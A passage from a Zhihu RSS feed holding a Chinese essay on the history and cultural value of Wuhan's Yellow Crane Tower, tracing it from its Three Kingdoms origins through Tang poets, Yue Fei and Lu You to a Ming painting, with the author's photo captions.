href=\"http://www.zhihu.com/people/xing-qiu-yan-jiu-suo?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">星球研究所</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/48230461/answer/2068476529?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">19 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/25516962?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">中国最美的秋天在哪里？</a><br><a href=\"http://www.zhihu.com/question/264237471?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">假如撒哈拉沙漠往后每年的降雨量和广东相当，在无人为因素的条件下，会不会成为一片沃土？</a><br>\n","link":"http://www.zhihu.com/question/48230461/answer/2068476529?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"武汉黄鹤楼既然是新建的，游览价值是什么？","date":"2021-08-26 03:55:55","description":"\n<p>文章发上知乎以来，为了对网友负责和对自己负责，最近几天先后修订十几遍，订正错别字外还添加多段必须添加的文字，为了说清楚文章想说的话。</p>\n<p>疫情前，《中国国家地理》期刊约稿，专写武汉黄鹤楼历史源脉和文化价值，即《武汉黄鹤楼》（刊发时题目有修改），文章已经正式刊发，谢谢！</p>\n<p>算不上黄鹤楼文史研究专业学者，这里仅就自己在写作中涉及到的一星半点相关知识，谈谈我对黄鹤楼文化价值的了解和理解。</p>\n<p>为了节省时间和精力，就不再另起炉灶布局谋篇一个新文了，蛮累的。有现成的文稿数篇，放电脑也是放着，找出来一边合成一边反复修改成下面的文字。黄鹤楼景区的图片，前前后后八九年间拍摄数次，有一些图片不知道存在哪里去了（家里五个电脑两个移动硬盘）？不过不要紧，以后有机会进黄鹤楼景区拍高清图片，以后的事了。</p>\n<p>谢谢赠给我历史资料图片的武汉文史圈专家学者老师！谢谢转发我文章的朋友老师！你们的支持和爱，是我人生坚强的动力！</p>\n<p>下面文章如果有补充文字，就放图片注释，大家阅读时请留意。</p>\n<p>先上图：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fb90c0ebf02477e2ab5db70132f06d7e_720w.jpg?rss\" data-rawwidth=\"2736\" data-rawheight=\"3648\" data-size=\"normal\" data-caption=\"黄鹤楼面对东方匾额上的大字“楚天极目”；面对南方：“南维高拱”；面对北方：“北斗平临“……此图黄鹤楼面对东方，面对江东（长江东岸）大片陆地，武昌过去直达湖南，古代楚国山河尽收眼底——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-fb90c0ebf02477e2ab5db70132f06d7e\" data-watermark-src=\"v2-c64c4ebb0dbb2c72f88e5ada2520f203\" data-private-watermark-src=\"v2-bb7318672132e1fb4601aa80047737fa\"></p>\n<p>下面我的文章全文——和投稿《中国国家地理》那一篇相似又不同。这篇文章的写作，完全达到了我想要的“效果”——把我多年来《黄鹤楼》写作研究中领悟到一些东西（文化知识、人生哲理等）委婉直白（两个词不矛盾）地表达出来了。当然，还得网友（读友）喜欢。</p>\n<h2>胡榴明：天地之间黄鹤楼</h2>\n<h3>黄鹄矶</h3>\n<p>武昌黄鹤楼，所以称为“天下绝景”，因为地理位置“绝无仅有”——“江南三大名楼”另外两座，江西滕王阁、湖南岳阳楼莫不如此。</p>\n<p>位于蛇山头，临于大江畔，黄鹤楼的存在，以及它存在的意义，从古至今，无可比拟。</p>\n<p>当年，江汉之交（古称长江和汉江交汇之地）江、河、湖，纵横恣肆，陆地稀缺，建城不容易。</p>\n<p>长江西来，江流千里，空中看蜿蜒曲折，地面看气势磅礴，进入武汉城市区，从西南向东北绕了一个半圈，分开龟蛇二山，与汉江汇合东去。</p>\n<p>江东蛇山，山形狭长，蛇形游走，匍匐横贯武昌城（古称夏口、江夏、鄂州、武昌），山脉顶端紧抵长江，山与江垂直，如英文字母“T”,横竖相接处，蛇山截止，千尺危崖临江兀立，山形随水势生威，登高如飞鸟临虚，古人取名黄鹄矶，也称黄鹤矶或黄鹊矶。</p>\n<p>黄鹤楼建在黄鹄矶上。</p>\n<p>危崖上建楼阁，楼阁上看风景， 看江看城，看天看地，高天大地、四野八荒，古今联想，时空悠游。</p>\n<p>当年的武昌老城，大道开阔，小巷幽深，一律青石板铺地，每数十步掘一口井，井口很小，圆圆一圈石头井栏，小木桶系一根绳子坠下去，拉上来半木桶清冷的甜水……（作者注：这一段文字描写是我小时候亲身经历，说明武昌老城痕迹一直保留到1980年前）</p>\n<p>蛇山山脊朝下望，里巷坊间屋舍儼然，气象森严的府衙，门陈罗琦的商埠，静守庭院的民居，笙箫弦管的歌坊酒肆……山北沙湖，山南南湖，湖心荷花，湖岸杨柳和芦苇……</p>\n<p>武昌长街（今解放路），顺长江流向延伸，西向横街通江边码头，东向横街通商贸集市，蛇山观风景，南湖逛夜市，阅马场演兵，城墙根下汉阳门外茶馆里喝茶戏园子里听戏，黄鹤楼下武昌城墙外长江边长长一条临江道，店铺一间挨一间，一隔隔门扇朝着江面大敞开，白天江上行舟千帆过往，夜里江畔泊船万灯明灭……</p>\n<p>临江道边有石阶，仰头山石嶙峋林木参差，古画中有烟云缭绕，现实中还不至于，山不在高……拾级而上黄鹄矶，很方便地来黄鹤楼登黄鹤楼（古代黄鹤楼不算高，主要是天造地设位置好）——离通衢大道不远，离人间烟火很近。</p>\n<p>历史上的黄鹤楼，从来都是屡毁屡建，仅明清两代就被毁7次、重建和维修10次……被毁原因很多，天灾和人祸，其实很多天灾也是人祸（木构架建筑的弱点）……赤焰黑烟散去，一方焦土一堆枯木，雕梁画栋，朱翠金碧，昨天成追忆，一场大梦惊醒——愈美丽，愈凄凉……</p>\n<p>1957年，武汉长江大桥建成，从汉阳龟山跨越大江落到武昌蛇山，黄鹄矶承托武昌桥头。</p>\n<p>这一年，黄鹄矶上早已经没有黄鹤楼，最后一幢中式古典木结构黄鹤楼火灾毁于光绪十年。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4c6c3834b6c931c3fe1e3e05ea3a862f_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"新建黄鹤楼蛇山上面对长江后退1000米，因为长江大桥武昌端建在黄鹄矶上。这是无可奈何的事，所以新建黄鹤楼楼高五层，且每一层高度都超过古代黄鹤楼建制，为了让登临者看得远一点。让我们把今天黄鹤楼当作一座容纳古今历史文化的博物馆吧。图：站在黄鹤楼最高处看风景——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-4c6c3834b6c931c3fe1e3e05ea3a862f\" data-watermark-src=\"v2-da4c28d2f5bbb1bb714bbe9a39bb08d7\" data-private-watermark-src=\"v2-b6ca5cfadbed948d20968ff81468342d\"></p>\n<h3>三国演义夏口城</h3>\n<p>元代有一出戏《黄鹤楼》，说的是周瑜在夏口（今湖北武汉市武昌区）城楼设宴企图诱杀刘备而不成的故事，后来改编成湖北地方戏楚剧和汉剧《刘备醉走黄鹤楼》。其实这出戏与史实不合：那一年，刘备病逝永安（今四川奉节）后孙权建夏口城，周瑜去世已经十三年。</p>\n<p>黄鹤楼的来历都知道和三国历史相关，“相关”到什么程度？一般人懒得往纵深想。</p>\n<p>东汉末年，曹操、刘备、孙权在长江中游域争斗激烈，赤壁之战孙刘联盟逼进军到长江边的曹军退回汉江上游，主战场随之转移。据守荆州五郡（今湖北湖南部分地区）同时出兵攻占襄阳威胁樊城，调虎离山镇守荆州的关羽——问题是关羽根本就没意识到此一去便是人生尽头。</p>\n<p>公元219年（建安十四年），曹操和孙权联手，魏军大将徐晃攻夺襄阳，吴军主将吕蒙攻克荆州，关羽败走麦城，遭遇吴军潘璋部将埋伏被俘身死。</p>\n<p>公元220年，曹操病逝洛阳，曹丕称帝，魏国立，大汉王朝结束。</p>\n<p>公元221年，称帝蜀汉的刘备不顾丞相诸葛亮极力劝阻，重兵战船出三峡沿江而下攻打东吴为关羽报仇（史学家认为意图夺回荆州）。吴军统帅陆逊迎战， “火烧连营七百里”，夷陵（今属宜昌）大败蜀军，稳固东吴长江中游地盘。 </p>\n<p>公元222年，魏文帝曹丕率大军南征，兵分三路直奔长江，围攻江陵（今荆州）六个月，东吴将领朱然固城坚守，魏军久攻不破撤军回许昌。</p>\n<p>公元223年，刘备病逝永安（今奉节），诸葛亮派外交重臣邓芝出蜀国至武昌（今鄂州）说服吴国与蜀国联军征伐魏国。同年，吴主孙权下令在汉江和长江交汇处长江南岸建城，防备曹魏军队再次从中原长驱直入进犯东吴。</p>\n<p>新城建在蛇山（古江夏山）山脊，隔江遥对汉江入江口——当年汉江名“夏水”，所以取名夏口——从此有了武昌城。</p>\n<p>随山形地势，城墙围绕一圈，西南角楼（古代城墙转角处城楼）位于离江畔最近的黄鹄矶，站高看远，茫茫荆楚地，滚滚东逝水，天地之间尽收眼底。</p>\n<p>夏口城墙西南角最早搭建了一个简陋透空的木架高台，后来随城池加固改建为建构完备的角楼——这，就是后来名扬天下的黄鹤楼。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-65001868a8c79c0688f0a391a42895bb_720w.jpg?rss\" data-rawwidth=\"1440\" data-rawheight=\"2560\" data-size=\"normal\" data-caption=\"2021年6月1日受媒体邀请在这里参加活动——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-65001868a8c79c0688f0a391a42895bb\" data-watermark-src=\"v2-dc093afa54e49b7a5013f48dc06d4d09\" data-private-watermark-src=\"v2-d8fbd633e17eefe63fa8760fd92af9f2\"></p>\n<p>荆州之战、襄樊之战、夷陵之战、江陵之战，关羽死、张飞死、刘备死，魏蜀吴三国将帅兵卒死，长江和汉江血染满江红……四次惨烈大战换来东吴建城夏口（今武昌），黄鹤楼横空出世（当年没有名字），继续《三国演义》剩下的故事。</p>\n<p>三国中，东吴存在时间最长，前后五十九年，版图包括今湖北、湖南、江西、安徽、江苏、浙江、广西、福建，以及越南北部……</p>\n<p>比较其他因为战争需要而临时建筑的驻军营垒，夏口城（今武昌）无疑是很幸运的——历史上兵家必争之地往往也是商贸繁荣之地——军队驻扎城内，百姓聚集城外，人口众多，粮草给养、日常用度，引来大批过往商船来往交易，黄鹄矶下长江边，码头建起来了，集市搭起来了，民房盖起来了，天长日久踩成一条长街，没有战事的日子里，军人和平民，城墙上下，城墙内外，秋月春风，一杯浊酒。</p>\n<p>公元279年，晋武帝司马炎命令晋军八部分兵六路大举进攻吴国建业（今南京）、棠邑（今六合）、当涂（今当涂）、武昌（今鄂州）、夏口（今武昌）、江陵（今荆州）……天下归晋。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6da72e08a077b84f157c420460c829b1_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"三国一段历史太复杂，网上和自己都没有图片可概括，就上一副书封图吧——《三国演义》罗贯中著，人民文学出版社1955年第一版1972年第16次重印本——胡榴明藏书。\" data-watermark=\"watermark\" data-original-src=\"v2-6da72e08a077b84f157c420460c829b1\" data-watermark-src=\"v2-085bfb250b16a26d411dd95b2f0f6ae8\" data-private-watermark-src=\"v2-b5bc373e0a4ec81d9366ea791e7e3add\"></p>\n<h3>李白的诗歌唐朝</h3>\n<p>东晋、西晋、南北朝，隋朝和唐朝，400年时间漫长。</p>\n<p>推想：某一个太平年月，有人来到黄鹄矶爬上西南角楼，“啊，这地方风景真好！”于是传扬开去，慕名而来的游人逐日增多，或文人墨客或达官显贵……</p>\n<p>军事瞭望楼改风景观赏楼，黄鹤楼正式诞生，顺应时代的需要。</p>\n<p>依然围在城墙内，楼阁下高台下单开一个城门，和平时开门礼让游客，隔扇窗雕花围栏，供人凭栏远眺。战乱时闭城门森严壁垒，观赏楼还原为瞭望楼，恢复战时功能——此时此刻，登高望远，心境大不同。</p>\n<p>“高树多悲风”，每逢战乱，武昌围城，黄鹤楼被毁首当其冲（城楼下敌军阵营一根携带油棉点燃火苗的箭矢射上来就能烧毁整座瞭望楼）。</p>\n<p>唐玄宗开元十三年（公元726年），李白二十六岁，离开蜀中来到楚地（今湖北湖南），娶前朝（唐高宗）宰相许圉师的孙女为妻，十年间以安陆为中心四方游历，多次往来江夏城（今武昌），有一天在黄鹤楼上读到崔颢《题黄鹤楼》。</p>\n<p> “昔人已乘黄鹤去，此地空余黄鹤楼，黄鹤一去不复返，白云千载空悠悠，晴川历历汉阳树，芳草萋萋鹦鹉洲，日暮乡关何处问，烟波江上使人愁。”</p>\n<p>传说当时李白留下这样一句话：“眼前有景道不得，崔颢题诗在上头”，“遂无诗而去”。</p>\n<p>传说不可信：从年轻到老，李白来江夏多次登黄鹤楼多次题诗多首。</p>\n<p>传说可信：李白对崔颢的诗的确很喜欢，喜欢到非照着写一首不可，于是有了下面的诗：</p>\n<p>“凤凰台上凤凰游，凤去台空江自流。吴宫花草埋幽径，晋代衣冠成古丘。三山半落青天外，二水中分白鹭洲。总为浮云能蔽日，长安不见使人愁”（李白《登金陵凤凰台》）。</p>\n<p>从动词名词组合到声腔韵律运用，以李白一向“持才傲物”的性情来说，对旁人的诗赏识到这个地步，真的是“爱之深切”了。</p>\n<p>李白《登金陵凤凰台》推崔颢《题黄鹤楼》，无论有意还是无意。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-cec489403796d9fd76fcb4e0d72afb2a_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"683\" data-size=\"normal\" data-caption=\"当年崔颢在黄鹤楼上看到的风景大抵如此图，除“忽略”当代建筑（长江大桥和龟山电视塔）外，当年（唐代）汉江入江口应在图左龟山南，现在改道至图右龟山北。图中对江汉阳江畔绿顶楼阁正是以崔颢诗意建起来的晴川阁——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-cec489403796d9fd76fcb4e0d72afb2a\" data-watermark-src=\"v2-4de6ec35f11db0b81499116908d610e1\" data-private-watermark-src=\"v2-3bb4ee960249bad1038b79d6344b0958\"></p>\n<p>从唐太宗的“贞观之治”，到唐玄宗的“开元盛世”，经济繁荣，疆域辽阔，亚洲文明的中心，四方国土来朝，包罗万象的唐文化至此抵达顶峰，诗歌文化和游冶文化随时代的兴盛而兴盛，一个思维自由创造力丰富的时代。</p>\n<p>黄鹤楼，以它得天独厚的人文地理优势，成为文人游走天下的必经之地，游山观水，登楼赋诗。</p>\n<p>公元735年（开元二十三年），孟浩然从故乡襄阳顺汉江下经江夏（今武昌）去广陵（今扬州），当天泊船黄鹄矶下，登黄鹤楼和当时闲居汉阳的李白见面然后分别。</p>\n<p>“吾爱孟夫子，风流天下闻”（李白《赠孟浩然》）。李白来楚地不久在襄阳和孟浩然认识，一直是非常要好的朋友，十年后再聚，再聚再分离。</p>\n<p>“故人西辞黄鹤楼,烟花三月下扬州，孤帆远影碧空尽，唯见长江天际流”</p>\n<p>——《黄鹤楼送孟浩然之广陵》。</p>\n<p>李白题黄鹤楼诗最通俗易懂的一首，如时下流行歌曲，亿万人传唱，你以为懂，其实你并不是很懂。</p>\n<p>天宝元年，李白奉召去长安出入宫廷伴随唐玄宗和杨贵妃认识一群诗人朋友诗酒唱和。</p>\n<p>公元755年（天宝十四年），安史之乱爆发，当时在江陵（今荆州）的李白受招募跑去永王璘麾下任幕僚。公元758年（唐肃宗乾元元年）因李璘案牵连流放夜郎（今贵州）途中经江夏（今武汉市武昌区下同）羁留将近四五个月，与汉阳（今武汉市汉阳区下同）王县令等地方官结为知交。江北汉阳城郊游湖饮酒，江南江夏（今武昌）城头登山听笛，日夜欢娱，日夜诗歌，例如《与史郎中钦听黄鹤楼上吹笛》</p>\n<p>“一为迁客去长沙，西望长安不见家。黄鹤楼中吹玉笛，江城五月落梅花”。</p>\n<p>这一次李白登黄鹤楼听《梅花落》，离上一次李白登黄鹤楼送孟浩然，时间相距三十三年。</p>\n<p>三十三年，转了一圈回到这里，人老了，旧日的朋友死了，山川依旧，物是人非，此时此刻，不知道李白心里在想什么。</p>\n<p>三十三年唐朝，太平的日子，灾难的日子，经历了太多，黄鹤楼依然立在原处。</p>\n<p>后人评价：此前黄鹤楼名气不大，自唐崔颢、李白之后名扬天下。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-adb0a703699f07a4031ec66be2b4dd2b_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"唐代黄鹤楼建筑群微缩模型。历代黄鹤楼微缩建筑模型全都陈列在今黄鹤楼四楼大厅。当天这里没有开大灯（也没有如今天好的手机和单反）拍摄效果极差——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-adb0a703699f07a4031ec66be2b4dd2b\" data-watermark-src=\"v2-97c7cc1ff580a9382d56e547eadd156f\" data-private-watermark-src=\"v2-e206e72179c5a1cfec1b2a6f4e191a6b\"></p>\n<p>永泰元年（公元765年），黄鹤楼已经是长江中游不可取代的名胜古迹游览景点（见唐·闫伯里《黄鹤楼记》）。这一年，李白去世已经三年。</p>\n<p>“永泰”，唐代宗的年号。</p>\n<p>唐代宗李豫，唐肃宗长子，安史之乱协助父亲平叛立功，以兵马大元帅身份收复长安、洛阳，立为皇太子，公元762年继位，平定内乱，改革税制，发展生产，“养民为先”，开启唐朝中兴时代。</p>\n<p>唐中期，黄鹤楼建设和江夏城（今武昌）建设比肩而行。</p>\n<p>诗人和政治家，名留史册，各有各的功绩。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5c6f3546323eabd94e8c4a3471fa1591_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"黄鹤楼大厅关于历代文人歌咏黄鹤楼的文字介绍，作为研究资料，很珍贵，所以拍照留存——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-5c6f3546323eabd94e8c4a3471fa1591\" data-watermark-src=\"v2-b8539ac5c931d15f239ed44a07d6a0e1\" data-private-watermark-src=\"v2-b893e8061fde9a3a5ff8c9f644a4cbd2\"></p>\n<p><b>岳飞《满江红》和陆游《入蜀记》</b></p>\n<p>曾经以为，南宋是一个凄哀的朝代，所有的一切都如深秋的草木枯萎凋落即将剩下支离破碎的枝条……</p>\n<p>后来知道武昌兴盛于南宋，确实很诧异。</p>\n<p>南宋王朝152年，以长江为天堑与金国南北对峙，守住半爿江山坚持这么多年还是不容易，靖康之乱后，宋军和金军在中原地区和长江沿线先后十几次惨烈战役，阻拦金军渡江，保住长江南岸农村继续耕种城市继续建设，临安（今杭州）朝廷笙箫歌舞。</p>\n<p>这样担惊受怕日夜心悬的情况下，长江流域居然成就了三个城市，扬州、镇江、鄂州（今武昌）——原因很简单，黄河流域华夏文明根基才华智慧金钱技艺思想文化全部转移到长淮之地长江南岸。乱世求太平，生产生活贸易娱乐文化教育，士农工商，该干什么干什么，哭是没有用的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-30c30aa03288a49d190138c5226f6076_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"古黄鹤楼前孔明灯，现在已经移到新建黄鹤楼面朝长江的广场上——资料图片。\" data-watermark=\"watermark\" data-original-src=\"v2-30c30aa03288a49d190138c5226f6076\" data-watermark-src=\"v2-ef631aac5d61901eafcb1e91a7db4d09\" data-private-watermark-src=\"v2-468d637f01cc1cdd7016bf9d102c53bd\"></p>\n<p>宋代鄂州（今武昌）繁华胜前朝，城墙扩大到蛇山根下，长江边黄鹤楼下城墙基下临江街市，蛇山下城墙（当时城墙圈非明清城墙圈）外南湖中央花街夜市（南草市）—— “商女不知亡国恨”，说也是白说。</p>\n<p>宋代黄鹤楼图，一副水墨，一副青绿，作者和年代均不可考。</p>\n<p>水墨《黄鹤楼卷》因年代久远墨迹模糊，望中如薄云缥缈中的仙山琼阁，重檐歇山顶，楼阁巍峨高耸。另一幅高楼雄伟，十字脊歇山顶，雕栏围绕，画廊凉亭。</p>\n<p>推测北宋时黄鹤楼不仅存在而且建筑壮观，南宋时黄鹤楼在还是不在就令人担忧了，因为上述两幅画图没有年代注明。</p>\n<p>关于南宋黄鹤楼的兴废，岳飞《满江红·登黄鹤楼有感》直接给出答案。</p>\n<p>公元1134年至公元1141年，主战派名将岳飞在鄂州（今武昌）屯兵驻守七年，以鄂州（今武昌）为基地三次北伐中原，今江汉平原（荆楚地区）和黄河中游平原（中原地区）曾经是岳家军和金军作战主战场。</p>\n<p>“遥望中原,荒烟外,许多城郭。想当年，花遮柳护,凤楼龙阁。万岁山前珠翠绕,篷壶殿里笙歌作，到而今,铁骑满郊风尘恶。兵安在？膏锋锷;民安在？填沟壑。叹江山如故,千村寥落。何日请缨提锐旅,一鞭直渡清河洛！却归来,重续汉阳游,骑黄鹤。”（岳飞《满江红·登黄鹤楼有感》）</p>\n<p>岳飞在鄂州（今武昌）期间，宋高宗（赵构）绍兴四年至绍兴十一年之间，黄鹤楼在。</p>\n<p>公元1140年，岳飞和儿子岳云率领军队从鄂州（今武昌）渡江进击中原，在郾城（今属漯河）、颍昌（今属许昌）与金军激战，进军朱仙镇途中被朝廷召回临安。失去统帅的岳家军，全军返回鄂州城，连送一步岳元帅都不可能……</p>\n<p>这是岳飞一生中最后一次领军北伐。</p>\n<p>“何日请缨提锐旅,一鞭直渡清河洛！却归来,重续汉阳游,骑黄鹤”。</p>\n<p>可是，再也归不来了。</p>\n<p>第二年（绍兴十一年）岳飞处死临安（今杭州）。宋宁宗时追封鄂王，纪念他最后几年驻兵鄂州（今武昌）。</p>\n<p>今黄鹤楼公园，蛇山脊建岳飞亭，立8米高青铜岳飞塑像，25米长青石浮雕，上刻“还我山河”岳飞手迹。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b60a57858d50b962337bcbe6b155f1c4_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"世纪钟背后不远即岳飞纪念亭，岳飞青铜像，“还我河山”巨型石刻——拍摄图片电脑里没有找到，以后有了再来这篇文章贴——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-b60a57858d50b962337bcbe6b155f1c4\" data-watermark-src=\"v2-168d28100bf68d8ebd2593c6ba50f67b\" data-private-watermark-src=\"v2-f5ffee99e0b08b0613064fb8d9b379f1\"></p>\n<p>公元1169年（乾道五年）十二月，陆游受任夔州（今重庆奉节）通判，携家人从山阴（今绍兴）乘船逆长江而上，第二年经过鄂州（今武汉市武昌区）、汉阳（今武汉市汉阳区）。</p>\n<p>陆游《入蜀记》详细描述鄂州城（今武昌）。江边：“出汉阳门江滨，城上居民市肆，数里不绝。其间复有巷陌，往来幢幢如织，盖四方商贾所集”;江面：“贾船客舫，不可胜计，衔尾者数里”;城墙内外：“市邑雄富，列肆繁错。城外南市亦数里“;“虽钱塘（今杭州）、建康（今南京）不能过，隐然一大都会”。</p>\n<p>宋代鄂州城（今武昌）以黄鹄山（今蛇山）山脚为限，军事行政机关设在山北和山脊，南城门外（今阅马场以南）南草市（当时商贸集市），南草市从长江边码头兴起向东南方发展，在南湖中间筑堤成街，商埠罗列，居民聚集。</p>\n<p>陆游途经鄂州（今武昌）这一年与岳飞驻军鄂州（今武昌）最后一年，其间相隔三十年，三十年前黄鹤楼在，三十年后黄鹤楼不在。</p>\n<p> “今楼已废，故址亦不复存”（《入蜀记》）——不仅楼毁了连遗址也毁了。</p>\n<p>这一年（乾道六年）陆游来鄂州（今武昌）游黄鹄山寻访黄鹤楼，同年鄂州城百姓在黄鹄山尾东城门外（今武昌大东门外）建忠烈庙祭祀岳将军——两件事看来毫无关联其实冥冥中相互关联。</p>\n<p>陆游一生倡议北伐一生不了其愿，“铁马冰河入梦来“，”家祭无忘告乃翁“——悲剧时代悲剧命运，英雄死，壮士老，黄鹤楼毁，历史翻过旧的一页。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e80a4af437d719929d61c4cc3d99a750_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"黄鹤楼风景区包括整整一长条蛇山山脊，在我游览的中国城市中心公园，这样构建绝无仅有，漫步在静寂的幽深的长长的山路上，古往今来的人物故事在心头漫漫涌起——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-e80a4af437d719929d61c4cc3d99a750\" data-watermark-src=\"v2-072578c42b090c90be45087760b8afdf\" data-private-watermark-src=\"v2-f381d87c5644a19ada94e0e8ca1587d4\"></p>\n<h3>锦衣卫画师安政文</h3>\n<p>公元1368年（洪武四年），江夏侯周德兴扩建湖广会城，扩大武昌城圈，蛇山南北平地例如宋代南草市一律圈进城墙内，大兴土木在蛇山上和蛇山北建造官衙府邸，同时黄鹄矶上重建黄鹤楼。</p>\n<p>公元1381年（洪武十四年），楚王朱桢分封武昌，蛇山南坡建造楚王府，八年完工，宫室巍峨，上与浮云齐，占据半个武昌城，同期修复宝通寺设为皇家寺院。</p>\n<p>公元1402年（建文四年），燕王朱棣废建文帝登帝位，永乐十九年迁都北京。</p>\n<p>永乐帝（明成祖朱棣）笃信道教到痴迷，公元1411年（永乐九年）征三十万劳力在武当山建宫殿式道教建筑，供奉北方玄武真武大帝，工程浩大，建筑华丽，十四年完工。 </p>\n<p><img src=\"https://pic4.zhimg.com/v2-c70b97dc5b28f796218c6282740140bf_720w.jpg?rss\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-size=\"normal\" data-caption=\"湖北武当山明代道教建筑群之紫霄宫——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-c70b97dc5b28f796218c6282740140bf\" data-watermark-src=\"v2-8fc55909b37b1925e616b2d7fcf1d81c\" data-private-watermark-src=\"v2-c01bd758bdb04a7ed7aac4862edbbc3f\"></p>\n<p>上行下效，一时间中国各地大兴道教大建道观。永乐十二年，武昌东城门外（今武昌大东门）扩建长春观成今天规模。楚王朱桢实际行动向皇帝兄长致意。 </p>\n<p>楚王朱桢，明太祖朱元璋第六子，驻藩武昌，子孙九代王位世袭，前后273年。</p>\n<p>燕王朱棣，明太祖第四子，夺帝位后对几个兄弟“怀柔”政策。各位藩王各踞一方，小心翼翼，看永乐帝的眼色。 </p>\n<p>唐代兴佛教，明代兴道教，都是皇帝起的头。</p>\n<p>明代画师安政文《黄鹤楼雪景图》：黄鹄矶上青砖垒砌高大的台基托住黄鹤楼建筑群，主楼重檐歇山顶加两个小歇山顶，屋脊正中宝瓶，檐下斗拱密集雕花繁复，楼内雕花木围栏，楼外雕花石围栏，台基下石阶斜斜沿山坡而下穿过雕花石坊，山脚下一棵枝干虬然的古松，三三五五步行骑马的游人，楼阁上推开隔扇窗卷起竹帘撑开布篷，薄雪覆盖琉璃瓦的颜色……</p>\n<p>台基上一群人拱手向天拜揖，画面右上方烟云缥缈处隐隐约约一只鹤载一个人不知是飞去还是飞来？</p>\n<p>道教文化色彩含蓄婉转地显露在这一幅画里。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ae320ae5458aa24caf823ca714dd3c1f_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"924\" data-size=\"normal\" data-caption=\"明代宫廷画家安政文《黄鹤楼雪景图》（局部）——资料图片\" data-watermark=\"watermark\" data-original-src=\"v2-ae320ae5458aa24caf823ca714dd3c1f\" data-watermark-src=\"v2-0b443b562ebb98a3d6e095c3d1107015\" data-private-watermark-src=\"v2-458fa89d6d7ea04c78f2df74686b0308\"></p>\n<p>当时，官宦、士子、商人，来黄鹤楼除宴饮游乐外往往聚一起谈仙论道——费文伟吹笛驾黄鹤翩然而去，道教传说与黄鹤楼千百年来联系紧密。</p>\n<p>史籍记载：明代黄鹤楼建筑群华丽恢弘史无前例。</p>\n<p>画作者安政文（安正文）其人其事，历史资料查阅，除“锦衣卫千户安政文”寥寥数字别无记载。</p>\n<p>锦衣卫，明太祖朱元璋设立于洪武十五年，先是直属皇上管理的亲兵侍卫队，后来职责范围扩大，秘密特工、独立执法，奉皇上命令监控群臣，一人之下、万人之上的朝廷私家军队。明洪武二十五年废除。明成祖朱棣在位时恢复建制并发展壮大。</p>\n<p>明永乐年间，征天下画艺高绝的人入宫，在文渊阁和武英殿遵皇上旨意绘画。明朝是宫廷画师最兴盛的朝代。</p>\n<p>永乐十五年，明成祖指示画师兼军职，入职锦衣卫，例如锦衣卫百户或锦衣卫千户画师不等。绘画本行，军职虚衔，待遇优厚，以示皇上对画师的“恩宠”。</p>\n<p>画师兼军职由永乐帝开始，但锦衣卫千户安政文并不一定是永乐年间人。</p>\n<p>明成祖后，宫廷画师兼职锦衣卫制度沿袭，宣德、成化、弘治，宫廷绘画抵达顶峰，直到明中期后江浙文人画兴起，民间绘画大家诞生，宫廷画派日趋没落。</p>\n<p>2006年版《中国古代绘画中的建筑与环境》（王其均著、中国建工出版社），其中《明代绘画中的楼阁建筑》一章，以安政文为明代建筑绘画代表，收入他《黄鹤楼雪景图》和《岳阳楼图》。</p>\n<p>安政文《黄鹤楼图》，想象和现实重叠，其中可能有依实景描摹的部分，也许武昌楚王请他来楚王宫作画，也许京城皇帝派他来武昌作画——总之，画留下来了，画的意义就不仅仅只是画了。</p>\n<p><sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"1\" data-text=\"关于安政文锦衣卫身份问题，写这篇文章时在网上查到几篇学术资料有简略介绍。特谢！\" data-url=\"\">[1]</sup></p>\n<h3>汉江揽胜图</h3>\n<p><img src=\"https://pic2.zhimg.com/v2-c549661201756069215e19660854d6bf_720w.jpg?rss\" 